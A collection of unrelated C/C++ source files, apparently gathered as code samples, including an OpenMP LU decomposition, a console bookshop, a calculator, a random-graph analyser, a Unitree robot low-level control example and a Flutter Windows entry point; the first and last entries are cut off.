    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "// lu_decomposition.cpp\n#include \"lu_decomposition.h\"\n#include <omp.h>\n#include <iostream>\n#include <cstdio>\n#include <cstdlib>\nusing namespace std;\n// LU Decomposition function\nvoid l_u_d(float** a, float** l, float** u, int size)\n{\n    // Initialize a simple lock for parallel region\n    omp_lock_t lock;\n    omp_init_lock(&lock);\n\n    // Initialize L and U matrices\n    for (int i = 0; i < size; i++) {\n        for (int j = 0; j < size; j++) {\n            if (i == j) {\n                l[i][j] = 1.0; // Diagonal elements of L are 1\n                u[i][j] = a[i][j];\n            } else if (i > j) {\n                l[i][j] = a[i][j];\n                u[i][j] = 0.0;\n            } else {\n                l[i][j] = 0.0;\n                u[i][j] = a[i][j];\n            }\n        }\n    }\n\n    // Parallelize the LU decomposition\n    #pragma omp parallel shared(a, l, u)\n    {\n        for (int k = 0; k < size; k++) {\n            // Update U matrix\n            #pragma omp for schedule(static)\n            for (int j = k; j < size; j++) {\n                omp_set_lock(&lock);\n                u[k][j] = a[k][j];\n                for (int s = 0; s < k; s++) {\n                    u[k][j] -= l[k][s] * u[s][j];\n                }\n                omp_unset_lock(&lock);\n            }\n\n            // Update L matrix\n            #pragma omp for schedule(static)\n            for (int i = k + 1; i < size; i++) {\n                omp_set_lock(&lock);\n                l[i][k] = a[i][k];\n                for (int s = 0; s < k; s++) {\n                    l[i][k] -= l[i][s] * u[s][k];\n                }\n                l[i][k] /= u[k][k];\n                omp_unset_lock(&lock);\n            }\n        }\n    }\n\n    omp_destroy_lock(&lock);\n}\nint main(int argc, char *argv[]) {\n    int size = 2;\n    float **a, **l, **u;\n\n    // Allocate memory for the 2D arrays\n    a = (float **)malloc(size * sizeof(float *));\n    l = (float **)malloc(size * sizeof(float *));\n    u = (float **)malloc(size * sizeof(float *));\n    for (int i = 0; i < size; i++) {\n        a[i] = (float *)malloc(size * sizeof(float));\n        l[i] = (float *)malloc(size * sizeof(float));\n        u[i] = (float *)malloc(size * sizeof(float));\n    }\n\n    // Initialize the array 'a'\n    float temp[2][2] = {\n        {4, 3},\n        {6, 3}\n    };\n    for (int i = 0; i < size; i++) {\n        for (int j = 0; j < size; j++) {\n            a[i][j] = temp[i][j];\n        }\n    }\n\n    // Perform LU decomposition\n    l_u_d(a, l, u, size);\n\n    // Print L matrix\n    printf(\"L Matrix:\\n\");\n    for(int i = 0; i < size; i++) {\n        for(int j = 0; j < size; j++) {\n            printf(\"%f \", l[i][j]);\n        }\n        printf(\"\\n\");\n    }\n\n    // Print U matrix\n    printf(\"U Matrix:\\n\");\n    for(int i = 0; i < size; i++) {\n        for(int j = 0; j < size; j++) {\n            printf(\"%f \", u[i][j]);\n        }\n        printf(\"\\n\");\n    }\n\n    return 0;\n}",
    "#include<iostream>\n#include<iomanip>\n#include<string>\n\nusing namespace std;\n\ntemplate <typename TO, typename T1, typename T2, typename T3, typename T4, typename T5>\nvoid print_row(std::ostream& os, TO const& to, T1 const& t1, T2 const& t2, T3 const& t3, T4 const& t4, T5 const& t5) {\n    os << \"| \" << std::setw(4) << to \n       << \" | \" << std::setw(10) << t1 \n       << \" | \" << std::setw(10) << t2 \n       << \" | \" << std::setw(15) << t3 \n       << \" | \" << std::setw(7) << std::fixed << std::setprecision(2) << t4 \n       << \" | \" << std::setw(7) << t5 \n       << \" |\\n\";\n}\n\nvoid print_border(std::ostream& os) {\n    os << \"+------+------------+------------+---------------+---------+---------+\\n\";\n}\n\nclass BookShop {\npublic:\n    string book_name;\n    string book_author;\n    string book_publisher;\n    int book_price;\n    int book_copies;\n\n    BookShop() {}\n\n    void add_book() {\n        cout << \"\\t\u25cf Enter Book Name: \";\n        cin.ignore();\n        getline(cin, book_name);\n        cout << \"\\t\u25cf Enter Book Author: \";\n        getline(cin, book_author);\n        cout << \"\\t\u25cf Enter Book Publisher: \";\n        getline(cin, book_publisher);\n        cout << \"\\t\u25cf Enter Book Price: \";\n        cin >> book_price;\n        cout << \"\\t\u25cf Enter Book Copies: \";\n        cin >> book_copies;\n    }\n\n    void display_book(int indx) {\n        print_row(cout, indx, book_name, book_author, book_publisher, book_price, book_copies);\n    }\n\n    bool check_availablilty(int& required_copies) {\n        return required_copies <= book_copies;\n    }\n\n    static int search_book(BookShop lot[], string& book_title, string& author_name, int& lot_size) {\n        for (int i = 0; i < lot_size; i++) {\n            if (lot[i].book_author == author_name && lot[i].book_name == book_title) {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    static void order_book(BookShop lot[], int lot_size) {\n        string book_title, author_name;\n        int required_copies;\n\n        cout << \" \u300bEnter Book Name: \";\n        cin.ignore();\n        getline(cin, book_title);\n        cout << \" \u300bEnter Book Author: \";\n        getline(cin, author_name);\n\n        int indx = BookShop::search_book(lot, book_title, author_name, lot_size);\n\n        if (indx != -1) {\n            cout << \" \u300bEnter Book Copies Required: \";\n            cin >> required_copies;\n\n            if (lot[indx].check_availablilty(required_copies)) {\n                cout << \" [ Order Successfully Placed !!! ]\" << endl;\n                lot[indx].book_copies -= required_copies;\n\n                cout << \"[ ORDER Details ]\" << endl;\n                print_border(cout);\n                print_row(cout, \"Sr.no\", \"Name\", \"Author\", \"Publisher\", \"Price\", \"Copies Left\");\n                print_border(cout);\n                lot[indx].display_book(indx);\n                print_border(cout);\n            }\n            else {\n                cout << \"OUT OF STOCK!!!\" << endl;\n            }\n\n        }\n        else {\n            cout << \"BOOK UNAVAILABLE IN SHOP!!!\" << endl;\n        }\n    }\n};\n\nint main() {\n    BookShop lot[5];\n    int lot_size = 0, choice;\n\n    do {\n        cout << \"\\nOperation Menu:\" << endl;\n        cout << \"1. ADD Books\" << endl;\n        cout << \"2. Order Book\" << endl;\n        cout << \"3. Display Books\" << endl;\n        cout << \"4. EXIT\" << endl;\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1: {\n            cout << \"Enter Number of BOOKS (Max 5): \";\n            cin >> lot_size;\n\n            if (lot_size > 5) {\n                cout << \"You can only add up to 5 books.\" << endl;\n                lot_size = 5;\n            }\n\n            for (int i = 0; i < lot_size; i++) {\n                cout << \"\\n \u300bEnter Details of Book - \" << i + 1 << \" : \" << endl;\n                lot[i].add_book();\n                cout << \"\\n\";\n            }\n            break;\n        }\n        case 2: {\n            if (lot_size == 0) {\n                cout << \"No books available. Please add books first.\" << endl;\n            }\n            else {\n                BookShop::order_book(lot, lot_size);\n            }\n            break;\n        }\n        case 3: {\n            if (lot_size == 0) {\n                cout << \"No books available.\" << endl;\n            }\n            else {\n                print_border(cout);\n                print_row(cout, \"No\", \"Name\", \"Author\", \"Publisher\", \"Price\", \"Copies\");\n                print_border(cout);\n                for (int i = 0; i < lot_size; i++) {\n                    lot[i].display_book(i + 1);\n                }\n                print_border(cout);\n            }\n            break;\n        }\n        case 4:\n            cout << \"Exiting...\" << endl;\n            break;\n        default:\n            cout << \"Invalid choice. Please try again.\" << endl;\n        }\n    } while (choice != 4);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <stdexcept>\n\nusing namespace std;\n\ndouble add(double x, double y) {\n    return x + y;\n}\n\ndouble subtract(double x, double y) {\n    return x - y;\n}\n\ndouble multiply(double x, double y) {\n    return x * y;\n}\n\ndouble divide(double x, double y) {\n    if (y == 0) {\n        throw runtime_error(\"Error! Division by zero.\");\n    }\n    return x / y;\n}\n\nint main() {\n    double num1, num2;\n    char operation;\n    \n    cout << \"Select operation (+, -, *, /): \";\n    cin >> operation;\n\n    cout << \"Enter first number: \";\n    cin >> num1;\n    cout << \"Enter second number: \";\n    cin >> num2;\n\n    try {\n        switch (operation) {\n            case '+':\n                cout << num1 << \" + \" << num2 << \" = \" << add(num1, num2) << endl;\n                break;\n            case '-':\n                cout << num1 << \" - \" << num2 << \" = \" << subtract(num1, num2) << endl;\n                break;\n            case '*':\n                cout << num1 << \" * \" << num2 << \" = \" << multiply(num1, num2) << endl;\n                break;\n            case '/':\n                cout << num1 << \" / \" << num2 << \" = \" << divide(num1, num2) << endl;\n                break;\n            default:\n                cout << \"Invalid operation.\" << endl;\n        }\n    } catch (const runtime_error& e) {\n        cout << e.what() << endl;\n    }\n\n    return 0;\n}\n",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <time.h>\n#include <malloc.h>\n#include <random>\n#include <locale>\n\nvoid initialize_graph(int size, int_fast8_t** graph_pointer, float edge_probability);\nint_fast8_t** create_graph(int size);\nvoid print_graph(int size, int_fast8_t** graph_pointer);\nvoid graph_info(int size, int_fast8_t** graph_pointer);\n\nint main() {\n\tsetlocale(LC_ALL, \"Russian\");\n\tint_fast8_t** graph;\n\tint size;\n\tfloat edge_probability;\n\n\tfprintf(stdout, \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u0435\u0440\u0448\u0438\u043d \u0433\u0440\u0430\u0444\u0430: \");\n\tif (!scanf(\"%d\", &size) || size <= 1) {\n\t\tfprintf(stderr, \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u0432\u043e\u0434\u0430 \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043c\u0430\u0441\u0441\u0438\u0432\u0430\");\n\t\texit(1);\n\t}\n\n\tfprintf(stdout, \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0440\u0435\u0431\u0440\u0430 (\u043e\u0442 0 \u0434\u043e 100): \");\n\tif (!scanf(\"%f\", &edge_probability) || edge_probability < 0 || edge_probability > 100) {\n\t\tfprintf(stderr, \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u0432\u043e\u0434\u0430 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u0438\");\n\t\texit(1);\n\t}\n\n\tgraph = create_graph(size);\n\tinitialize_graph(size, graph, edge_probability);\n\tprintf(\"\u041c\u0430\u0442\u0440\u0438\u0446\u0430 \u0441\u043c\u0435\u0436\u043d\u043e\u0441\u0442\u0438: \\n\\n\");\n\tprint_graph(size, graph);\n\tgraph_info(size, graph);\n\n\tfor (int i = 0; i < size; i++) {\n\t\tfree(graph[i]);\n\t}\n\tfree(graph);\n\n\treturn 0;\n}\n\nint_fast8_t** create_graph(int size) {\n\tint_fast8_t** array = (int_fast8_t**)malloc(sizeof(int_fast8_t*) * size);\n\tfor (int i = 0; i < size; i++) {\n\t\tarray[i] = (int_fast8_t*)malloc(sizeof(int_fast8_t) * size);\n\t}\n\tif (array == NULL) {\n\t\tfprintf(stderr, \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u043c\u0430\u0441\u0441\u0438\u0432\u0430\");\n\t\texit(1);\n\t}\n\treturn array;\n}\n\nvoid initialize_graph(int size, int_fast8_t** graph_pointer, float edge_probability) {\n\tsrand((unsigned int)time(NULL));\n\tfor (int i = 0; i < size; i++) {\n\t\tfor (int j = i + 1; j < size; j++) {\n\t\t\tif ((float)rand() / (RAND_MAX / 100) < edge_probability) {\n\t\t\t\tgraph_pointer[i][j] = 1;\n\t\t\t\tgraph_pointer[j][i] = 1;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tgraph_pointer[i][j] = 0;\n\t\t\t\tgraph_pointer[j][i] = 0;\n\t\t\t}\n\t\t}\n\t\tgraph_pointer[i][i] = 0;\n\t}\n}\n\nvoid print_graph(int size, int_fast8_t** graph_pointer) {\n\tfor (int i = 0; i < size; i++) {\n\t\tfor (int j = 0; j < size; j++) {\n\t\t\tfprintf(stdout, \"%d \", graph_pointer[j][i]);\n\t\t}\n\t\tfprintf(stdout, \"\\n\");\n\t}\n}\n\nvoid graph_info(int size, int_fast8_t** graph_pointer) {\n    int edge_count = 0;\n    int* isolated_vertices = (int*)calloc(size, sizeof(int));\n    int* leaf_vertices = (int*)calloc(size, sizeof(int));\n    int* dominating_vertices = (int*)calloc(size, sizeof(int));\n    int isolated_count = 0, leaf_count = 0, dominating_count = 0;\n\n    for (int i = 0; i < size; i++) {\n        int degree = 0;\n        int is_isolated = 1;\n        int is_dominating = 1;\n        for (int j = 0; j < size; j++) {\n            if (graph_pointer[i][j] == 1) {\n                is_isolated = 0;\n                degree++;\n                if (i < j) {\n                    edge_count++;\n                }\n            }\n            else if (i != j) {\n                is_dominating = 0;\n            }\n        }\n        if (is_isolated) {\n            isolated_vertices[isolated_count++] = i + 1;\n        }\n        else if (degree == 1) {\n            leaf_vertices[leaf_count++] = i + 1;\n        }\n        if (is_dominating) {\n            dominating_vertices[dominating_count++] = i + 1;\n        }\n    }\n\n    printf(\"\\n\u0420\u0430\u0437\u043c\u0435\u0440 \u0433\u0440\u0430\u0444\u0430: %d\\n\", edge_count);\n\n    printf(\"\\n\u0418\u0437\u043e\u043b\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435 \u0432\u0435\u0440\u0448\u0438\u043d\u044b:\\n\");\n    if (isolated_count == 0) {\n        printf(\"\u0418\u0437\u043e\u043b\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 \u0432\u0435\u0440\u0448\u0438\u043d \u043d\u0435\u0442\\n\");\n    }\n    else {\n        for (int i = 0; i < isolated_count; i++) {\n            printf(\"%d \", isolated_vertices[i]);\n        }\n        printf(\"\\n\");\n    }\n\n    printf(\"\\n\u041a\u043e\u043d\u0446\u0435\u0432\u044b\u0435 \u0432\u0435\u0440\u0448\u0438\u043d\u044b:\\n\");\n    if (leaf_count == 0) {\n        printf(\"\u041a\u043e\u043d\u0446\u0435\u0432\u044b\u0445 \u0432\u0435\u0440\u0448\u0438\u043d \u043d\u0435\u0442\\n\");\n    }\n    else {\n        for (int i = 0; i < leaf_count; i++) {\n            printf(\"%d \", leaf_vertices[i]);\n        }\n        printf(\"\\n\");\n    }\n\n    printf(\"\\n\u0414\u043e\u043c\u0438\u043d\u0438\u0440\u0443\u044e\u0449\u0438\u0435 \u0432\u0435\u0440\u0448\u0438\u043d\u044b:\\n\");\n    if (dominating_count == 0) {\n        printf(\"\u0414\u043e\u043c\u0438\u043d\u0438\u0440\u0443\u044e\u0449\u0438\u0445 \u0432\u0435\u0440\u0448\u0438\u043d \u043d\u0435\u0442\\n\");\n    }\n    else {\n        for (int i = 0; i < dominating_count; i++) {\n            printf(\"%d \", dominating_vertices[i]);\n        }\n        printf(\"\\n\");\n    }\n\n    free(isolated_vertices);\n    free(leaf_vertices);\n    free(dominating_vertices);\n}",
    "#include <iostream>\n#include <cmath>\n#include <iomanip>\n\nusing namespace std;\n\ndouble j(const double x);\n\nint main()\n{\n    double kp, kk, z, k, dk;\n    int n;\n\n    cout << \"k poch: \"; cin >> kp;\n    cout << \"k kinz: \"; cin >> kk;\n    cout << \"n : \"; cin >> n;\n\n    dk = (kk - kp) / n;\n    k = kp;\n\n    cout << \"+\" << setw(12) << setfill('-') << \"+\" << setw(17) << \"+\" << endl;\n    cout << \"|\" << setw(10) << setfill(' ') << \"k\" << \" |\" << setw(15) << \"z\" << \" |\" << endl;\n    cout << \"+\" << setw(12) << setfill('-') << \"+\" << setw(17) << \"+\" << endl;\n\n    while (k <= kk)\n    {\n        z = j(1 + k + j(k) + pow(j(1 + k * k), 2));\n        cout << \"|\" << setw(10) << setfill(' ') << k << \" |\" << setw(15) << z << \" |\" << endl;\n        k += dk;\n    }\n\n    cout << \"+\" << setw(12) << setfill('-') << \"+\" << setw(17) << \"+\" << endl;\n\n    return 0;\n}\n\ndouble j(const double x)\n{\n    if (abs(x) >= 1) {\n        return ((cos(x) + exp(-abs(x))) / (pow(cos(x), 2) + 1));\n    }\n    else {\n        double sum = 0, a = x;\n        sum = a;\n\n        for (int i = 1; i <= 5; i++) {\n            a *= (x * x) / ((2 * i) * (2 * i + 1));\n            sum += a;\n        }\n        return sum;\n    }\n}\n",
    "/**********************************************************************\n Copyright (c) 2020-2023, Unitree Robotics.Co.Ltd. All rights reserved.\n***********************************************************************/\n\n#include \"unitree_legged_sdk/unitree_legged_sdk.h\"\n#include <math.h>\n#include <iostream>\n\nusing namespace UNITREE_LEGGED_SDK;\n\nclass Custom\n{\npublic:\n  Custom(uint8_t level) : safe(LeggedType::Go1),\n                          udp(level, 8090, \"192.168.123.10\", 8007)\n  {\n    udp.InitCmdData(cmd);\n  }\n  void UDPRecv();\n  void UDPSend();\n  void RobotControl();\n\n  Safety safe;\n  UDP udp;\n  LowCmd cmd = {0};\n  LowState state = {0};\n  int Tpi = 0;\n  int motiontime = 0;\n  float dt = 0.002; // 0.001~0.01\n};\n\nvoid Custom::UDPRecv()\n{\n  udp.Recv();\n}\n\nvoid Custom::UDPSend()\n{\n  udp.Send();\n}\n\nvoid Custom::RobotControl()\n{\n  motiontime++;\n  udp.GetRecv(state);\n\n  // gravity compensation\n  cmd.motorCmd[FR_0].tau = -0.65f;\n  cmd.motorCmd[FL_0].tau = +0.65f;\n  cmd.motorCmd[RR_0].tau = -0.65f;\n  cmd.motorCmd[RL_0].tau = +0.65f;\n\n  if (motiontime >= 500)\n  {\n    float speed = 2 * sin(3 * M_PI * Tpi / 1500.0);\n\n    cmd.motorCmd[FR_1].q = PosStopF;\n    cmd.motorCmd[FR_1].dq = speed;\n    cmd.motorCmd[FR_1].Kp = 0;\n    cmd.motorCmd[FR_1].Kd = 4;\n    cmd.motorCmd[FR_1].tau = 0.0f;\n    Tpi++;\n  }\n\n  if (motiontime > 10)\n  {\n    int res1 = safe.PowerProtect(cmd, state, 1);\n    // You can uncomment it for position protection\n    // int res2 = safe.PositionProtect(cmd, state, 10);\n    if (res1 < 0)\n      exit(-1);\n  }\n\n  udp.SetSend(cmd);\n}\n\nint main(void)\n{\n  std::cout << \"Communication level is set to LOW-level.\" << std::endl\n            << \"WARNING: Make sure the robot is hung up.\" << std::endl\n            << \"NOTE: The robot also needs to be set to LOW-level mode, otherwise it will make strange noises and this example will not run successfully! \" << std::endl\n            << \"Press Enter to continue...\" << std::endl;\n  std::cin.ignore();\n\n  Custom custom(LOWLEVEL);\n  LoopFunc loop_control(\"control_loop\", custom.dt, boost::bind(&Custom::RobotControl, &custom));\n  LoopFunc loop_udpSend(\"udp_send\", custom.dt, 3, boost::bind(&Custom::UDPSend, &custom));\n  LoopFunc loop_udpRecv(\"udp_recv\", custom.dt, 3, boost::bind(&Custom::UDPRecv, &custom));\n\n  loop_udpSend.start();\n  loop_udpRecv.start();\n  loop_control.start();\n\n  while (1)\n  {\n    sleep(10);\n  };\n\n  return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"untitled\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\nvoid Create(int* arr, const int size, const int Low, const int High, int i) {\n    if (i < size) {\n        arr[i] = Low + rand() % (High - Low + 1);\n        Create(arr, size, Low, High, i + 1); \n    }\n}\n\nvoid Print(int* arr, const int size, int i) {\n    if (i < size) {\n        cout << setw(4) << arr[i];\n        Print(arr, size, i + 1); \n    }\n    else {\n        cout << endl;\n    }\n}\n\nint Max(int* arr, const int size, int i, int max) {\n    if (i < size) {\n        if (arr[i] > max) {\n            max = arr[i];\n        }\n        return Max(arr, size, i + 1, max); \n    }\n    return max; \n}\n\nint Min(int* arr, const int size, int i, int min) {\n    if (i < size) {\n        if (arr[i] < min) {\n            min = arr[i];\n        }\n        return Min(arr, size, i + 1, min); \n    }\n    return min; \n}\n\nint MaxIndex(int* arr, const int size, int max, int i) {\n    if (i >= size) return -1; \n    if (arr[i] == max) return i;\n    return MaxIndex(arr, size, max, i + 1);\n}\n\nint MinIndex(int* arr, const int size, int min, int i) {\n    if (i >= size) return -1;\n    if (arr[i] == min) return i; \n    return MinIndex(arr, size, min, i + 1); \n}\n\nvoid SwapMinMax(int* arr, const int size) {\n    int min = Min(arr, size, 1, arr[0]); \n    int max = Max(arr, size, 1, arr[0]); \n\n    int minIndex = MinIndex(arr, size, min, 0); \n    int maxIndex = MaxIndex(arr, size, max, 0); \n\n    if (minIndex != maxIndex) {\n        int temp = arr[minIndex];\n        arr[minIndex] = arr[maxIndex];\n        arr[maxIndex] = temp;\n    }\n}\n\nint main() {\n    srand((unsigned)time(NULL)); \n\n    const int n = 15;  \n    int arr[n];\n    int Low = 1;        \n    int High = 100;     \n   \n    Create(arr, n, Low, High, 0);\n    Print(arr, n, 0);\n    int max = Max(arr, n, 1, arr[0]);\n    int min = Min(arr, n, 1, arr[0]);\n    cout << \"Max element index: \" << MaxIndex(arr, n, max, 0) << \" (value: \" << max << \")\" << endl;\n    cout << \"Min element index: \" << MinIndex(arr, n, min, 0) << \" (value: \" << min << \")\" << endl;\n    SwapMinMax(arr, n);\n    Print(arr, n, 0);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <bitset>\n#include <vector>\n#include <limits>\n#include <numeric>\n#include <string>\n\nusing namespace std;\n\nconst string RED_COLOR = \"\\033[31m\";\nconst string CYAN_COLOR = \"\\033[36m\";\nconstexpr int HL_1 = 14 - 1;\nconstexpr int HL_2 = 3 - 1;\n\nstring decimalToBinary(const int number) {\n    return bitset<8>(number).to_string();\n}\n\nstring color(const string &str, const string &color) {\n    return color + str + \"\\033[0m\"; // ANSI escape code to reset color\n}\n\nvector<int> getUserInput() {\n    vector<int> bytes(2);\n    for (int i = 0; i < 2; ++i) {\n        int input;\n        cout << \"Enter byte \" << (i + 1) << \" (0-255): \";\n        while (true) {\n            if (cin >> input) {\n                if (input < 0 || input > 255) {\n                    input = input % 256; // Handle overflow\n                }\n                bytes[i] = input == 130 ? 130 : input;\n                break;\n            }\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            bytes[i] = 130; // Default on incorrect input\n            break;\n        }\n    }\n    return bytes;\n}\n\nvector<int> combineBytesToBinaryArray(const vector<int> &bytes) {\n    vector<int> binaryArray(16);\n    for (int i = 0; i < 8; ++i) {\n        binaryArray[i] = (bytes[0] >> (7 - i)) & 1;\n        binaryArray[i + 8] = (bytes[1] >> (7 - i)) & 1;\n    }\n    return binaryArray;\n}\n\nstring getHighlightedArray(const vector<int> &array, int highlightIndex1, int highlightIndex2) {\n    string result;\n    for (int i = 0; i < 